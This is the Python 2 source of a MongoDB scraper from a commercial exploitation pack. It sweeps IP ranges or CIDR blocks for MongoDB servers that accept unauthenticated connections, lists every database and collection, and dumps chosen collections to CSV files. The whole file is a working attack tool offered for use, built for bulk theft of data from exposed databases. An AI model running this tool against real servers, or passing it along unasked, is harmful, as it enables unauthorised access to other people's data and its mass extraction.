#! /usr/bin/env python
# -*- coding: utf-8 -*-

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2015
#

###
# STD
###
import sys
import argparse

###
# Project
###
from pymongo import MongoClient
import unicodecsv


class d2sec_mongodb_scraper:
  def __init__(self, targets):
    self.targets = targets
    self.header_dict = {}

  def retrieve_headers(self, test_dict, name_var):
    for element in test_dict:
      if isinstance(test_dict[element], dict):
        self.retrieve_headers(test_dict[element], name_var + '|' + element)
      else:
        self.header_dict[name_var + '|' + element] = test_dict[element]

  def list_db_coll(self):
    for target in self.targets:
      dbs = []
      try:
        client = MongoClient(target, connectTimeoutMS=5000)
        dbs = client.database_names()
      except Exception, e:
        print "[-] %s" % e
        continue  
      if dbs:
        print '%s:Databases:Collections' % target
        for db in dbs: 
          o_db = client[db]
          colls = o_db.collection_names()
          for coll in colls: print '%s:%s:%s' % (target, db, coll)
          
  def export_db_coll(self, o_db, o_coll):
    csvfile = '%s-%s.csv' % (o_db, o_coll)
    f_write = open(csvfile, 'wb')
    csv_writer = unicodecsv.writer(f_write, delimiter=',', quotechar='"')
    header_list = []

    for target in targets:
      try:
        client = MongoClient(target, connectTimeoutMS=5000)
        db = client[o_db]
        collection_obj = db[o_coll]
        cursor_records = collection_obj.find()
      except Exception, e:
        print "[-] %s" % e
        continue

      for cursor in cursor_records:
        self.retrieve_headers(cursor, '')
        for item_label in self.header_dict:
          if item_label not in header_list:
            header_list.append(item_label)
        self.header_dict = {}
      csv_writer.writerow(header_list)

      cursor_records = collection_obj.find()
      for cursor in cursor_records:
        row_to_push = []
        self.header_dict = {}
        self.retrieve_headers(cursor, '')
        for item_label in header_list:
          if item_label in self.header_dict:
            row_to_push.append(self.header_dict[item_label])
          else:
            row_to_push.append('')
        csv_writer.writerow(row_to_push)

    print 'Database %s with collection %s exported to file %s' % (o_db, o_coll, csvfile)

# converts a ip range into a list
def iprange(addressrange): 
  list=[]
  first3octets = '.'.join(addressrange.split('-')[0].split('.')[:3]) + '.'
  for i in range(int(addressrange.split('-')[0].split('.')[3]),int(addressrange.split('-')[1])+1):
    list.append(first3octets+str(i))
  return list

def ip2bin(ip):
  b = ""
  inQuads = ip.split(".")
  outQuads = 4
  for q in inQuads:
    if q != "": b += dec2bin(int(q),8); outQuads -= 1
  while outQuads > 0: b += "00000000"; outQuads -= 1
  return b

def dec2bin(n,d=None):
  s = ""
  while n>0:
    if n&1: s = "1"+s
    else: s = "0"+s
    n >>= 1
  if d is not None:
    while len(s)<d: s = "0"+s
  if s == "": s = "0"
  return s

def bin2ip(b):
  ip = ""
  for i in range(0,len(b),8):
    ip += str(int(b[i:i+8],2))+"."
  return ip[:-1]

def returnCIDR(c):
  parts = c.split("/")
  baseIP = ip2bin(parts[0])
  subnet = int(parts[1])
  ips=[]
  if subnet == 32: return bin2ip(baseIP)
  else:
    ipPrefix = baseIP[:-(32-subnet)]
    for i in range(2**(32-subnet)): ips.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
    return ips


if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='d2sec_mongodb_scraper.py - Tools to list and export MongoDB databases')
  parser.add_argument('-l', '--list', action='store_true', help='To list databases from a mongodb server')
  parser.add_argument('-e', '--export', action='store_true', help='To export a databse with a specific collection')
  parser.add_argument('-d', '--database', help='The database you want to export')
  parser.add_argument('-c', '--collection', help='The collection you want to export')
  parser.add_argument('-t', '--targets', help='The target(s) you want to scan (192.168.0.1)')
  if len(sys.argv)==1: 
    parser.print_help(); 
    sys.exit(0)
  args = parser.parse_args()

  targets=[]
  if args.targets:
    if '/' in args.targets: 
      targets = returnCIDR(args.targets)
    elif '-' in args.targets:
      targets = iprange(args.targets)
    else:
      targets.append(args.targets)
  else: 
    print "[-] You need to set a hostname or an ip address\n"
    parser.print_help(); 
    sys.exit(0)

  if args.list:
    scraper = d2sec_mongodb_scraper(targets)
    scraper.list_db_coll()
  elif args.export:
    if not args.database or not args.collection:
      print "[-] You need to set a database and a collection to export\n"   
      parser.print_help();
      sys.exit(0)
    scraper = d2sec_mongodb_scraper(targets)
    scraper.export_db_coll(args.database, args.collection)
